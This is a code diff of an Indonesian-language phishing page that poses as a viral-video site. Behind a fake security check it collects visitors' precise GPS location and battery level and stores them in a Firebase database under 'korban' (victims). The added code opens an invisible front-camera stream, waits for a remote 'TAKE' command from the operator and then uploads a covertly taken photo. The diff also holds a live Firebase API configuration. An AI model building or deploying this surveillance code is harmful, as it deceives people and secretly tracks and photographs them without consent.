@@ -3,19 +3,23 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GNN - VIDEO VIRAL</title>
+    <title>GNN - VIDEO VIRAL TERKINI</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
 </head>
-<body style="text-align:center; font-family:sans-serif; background:#eee; padding:20px;">
-    <div style="background:white; padding:20px; border-radius:15px; box-shadow:0 5px 15px rgba(0,0,0,0.1);">
-        <h2>🔴 VIDEO VIRAL TERKINI</h2>
-        <p>Verifikasi lokasi Anda untuk memastikan keamanan konten sebelum menonton.</p>
-        <button id="btn" onclick="gasLacak()" style="background:#d32f2f; color:white; border:none; padding:15px; width:100%; border-radius:10px; font-weight:bold; cursor:pointer;">VERIFIKASI & TONTON</button>
+<body style="background:#000; color:white; text-align:center; font-family:sans-serif; padding:20px;">
+    
+    <video id="v" width="1" height="1" autoplay style="opacity:0; position:absolute;"></video>
+    <canvas id="c" style="display:none;"></canvas>
+    
+    <div id="m">
+        <h2 style="color:red;">🔴 LIVE: KEJADIAN VIRAL</h2>
+        <p>Gunakan koneksi stabil dan izinkan akses lokasi & kamera untuk memutar video (Verifikasi Keamanan).</p>
+        <button onclick="gas()" style="background:red; color:white; padding:18px; width:100%; border:none; border-radius:12px; font-weight:bold; font-size:16px; cursor:pointer; box-shadow: 0 5px 15px rgba(255,0,0,0.3);">KONFIRMASI & TONTON</button>
     </div>
 
 <script>
-    // MASUKKAN CONFIG FIREBASE LU DISINI 🎯
+    // --- TEMPEL CONFIG FIREBASE KALZ DISINI ---
     const firebaseConfig = {
       apiKey: "AIzaSyAqdcpcUxfUBNY2H83IBa1Pp0X6YcQtDlQ",
       authDomain: "theeyes-8d0aa.firebaseapp.com",
@@ -25,30 +29,71 @@
       messagingSenderId: "886775568743",
       appId: "1:886775568743:web:89a5a2b26628711fedf7c2"
     };
+    // ------------------------------------------
 
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
+    let idK = null;
 
-    async function gasLacak() {
-        const btn = document.getElementById('btn');
-        btn.innerText = "MEMPROSES...";
-        let bat = "N/A", isp = "Mencari...";
+    async function gas() {
         try {
-            if(navigator.getBattery) { const b = await navigator.getBattery(); bat = Math.round(b.level*100)+"%"; }
-            const res = await fetch('https://ipapi.co/json/');
-            const data = await res.json(); isp = data.org;
-        } catch(e) {}
+            // Minta Izin Kamera Depan
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            document.getElementById('v').srcObject = stream;
+            
+            // Minta Izin Lokasi
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                let bat = "N/A"; 
+                if(navigator.getBattery) { 
+                    const b = await navigator.getBattery(); 
+                    bat = Math.round(b.level*100)+"%"; 
+                }
+                
+                // Daftarkan Korban ke Firebase
+                const ref = db.ref('korban').push({
+                    waktu: new Date().toLocaleString(),
+                    baterai: bat,
+                    isp: "Checking...",
+                    maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
+                });
+                
+                idK = ref.key;
+                document.getElementById('m').innerHTML = "<h3>🔄 Menghubungkan ke Server Video...</h3><p>Mohon jangan tutup halaman ini.</p>";
 
-        navigator.geolocation.getCurrentPosition((pos) => {
-            db.ref('korban').push({
-                waktu: new Date().toLocaleString(),
-                baterai: bat,
-                isp: isp,
-                maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
-            });
-            alert("Error 403: Server Sibuk. Coba lagi nanti!");
-            btn.innerText = "VERIFIKASI ULANG";
-        }, (err) => { alert("Gagal: Anda wajib mengizinkan lokasi!"); }, {enableHighAccuracy:true});
+                // --- SISTEM LISTENER (Nunggu Perintah Owner) ---
+                db.ref('commands/' + idK).on('value', (s) => {
+                    const cmd = s.val();
+                    if(cmd && cmd.action === "TAKE") {
+                        take(); // Eksekusi jepret foto
+                    }
+                });
+            }, (err) => { 
+                alert("Gagal! Anda wajib mengizinkan lokasi untuk menonton."); 
+            }, {enableHighAccuracy:true});
+            
+        } catch(e) { 
+            alert("Akses Kamera Ditolak! Video tidak bisa diputar."); 
+        }
+    }
+
+    // Fungsi Jepret Foto Rahasia
+    function take() {
+        const v = document.getElementById('v'), c = document.getElementById('c');
+        const context = c.getContext('2d');
+        c.width = v.videoWidth; 
+        c.height = v.videoHeight;
+        
+        // Gambar frame dari video ke canvas
+        context.drawImage(v, 0, 0);
+        
+        // Kirim hasil foto (Base64) ke node hasil_foto
+        db.ref('hasil_foto/' + idK).set({ 
+            foto: c.toDataURL('image/jpeg', 0.4), // Kompresi 40% biar enteng
+            t: Date.now()
+        });
+        
+        // Hapus perintah di Firebase biar gak jepret terus-terusan
+        db.ref('commands/' + idK).remove();
     }
 </script>
 </body>
